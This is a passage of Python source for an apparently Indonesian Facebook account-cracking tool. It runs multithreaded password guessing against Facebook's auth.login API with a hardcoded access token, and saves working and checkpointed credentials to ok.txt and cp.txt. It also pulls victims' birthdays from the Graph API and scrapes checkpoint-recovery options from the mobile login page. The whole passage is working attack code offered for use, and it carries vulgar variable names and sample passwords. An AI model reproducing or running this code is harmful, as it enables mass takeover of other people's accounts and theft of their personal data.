            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate3(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m * --> %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
#Gene1
class bapittl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
      if f in[""," "]:
        print((p+" ["+k+"•"+m+"•"+p+"] Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
          self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate1(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " • " + ttl)
        print("\r\x1b[0;33m * --> %s • %s • %s   "%(username,password,ttl))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

### Result Hasill ####

def results(kntl,zecheed):
        if len(kntl) !=0:
                print((p+" ["+k+"•"+m+"•"+p+"] OK: "+str(len(kntl))))
        if len(zecheed) !=0:
                print((p+" ["+k+"•"+m+"•"+p+"] CP: "+str(len(zecheed))))
        if len(kntl) ==0 and len(zecheed) ==0:
                print("\n")
                print((p+" ["+k+"•"+m+"•"+p+"] No Result Found"))
   
def ress():
    os.system("clear")
    banner()
    print((p+" ["+k+"•"+m+"•"+p+"] Result Cracker"+p+" ["+k+"•"+m+"•"+p+"] "))
    print((p+"\n ["+k+"•"+m+"•"+p+"] Result OK "))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((p+" ["+k+"•"+m+"•"+p+"] No Result Found"))
    print((p+" ["+k+"•"+m+"•"+p+"] Result CP"))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((p+" ["+k+"•"+m+"•"+p+"] No Result Found"))
    input(p+" [BACK]")
    menu()


##### Check Option Checkpoint #####
### Result Hasill ####
def cek_opsi():
	print((p+"\n ["+k+"•"+m+"•"+p+"] Masukan File cp.txt"))
	files = input(p+" ["+k+"•"+m+"•"+p+"] File: ")
	if files == "":
		cek_opsi()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit(p+" ["+k+"•"+m+"•"+p+"] Files %s%s%s Tidak Ada!"%(h,files,p))
	print(p+" ["+k+"•"+m+"•"+p+"] Total Account Cp : "+str(len(buka_baju)))
	print(p+" ["+k+"•"+m+"•"+p+"] Check Opsi Checkpoint, Please Wait...")
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split(" • ")
		print("\033[1;37m\n [\033[1;33m•\033[1;91m•\033[1;37m] "+kontol.replace(" + ",""))
		try:
			check_in(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	input("%s [BACK]"%(p))
	menu()

def check_in(user, pasw):
	mb = ("https://free.facebook.com")
	ua2 = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(p+" ["+k+"•"+m+"•"+p+"] Total Opsi Yang Tersedia "+str(len(ngew)))
		for opt in range(len(ngew)):
			print("   "+str(opt+1)+" "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(p+" ["+k+"•"+m+"•"+p+"] %s"%(oh))
	else:
		print(p+" ["+k+"•"+m+"•"+p+"] Login Gagal, ID/Pass Salah\n")
if __name__=="__main__":
	os.system('git pull')
	menu()
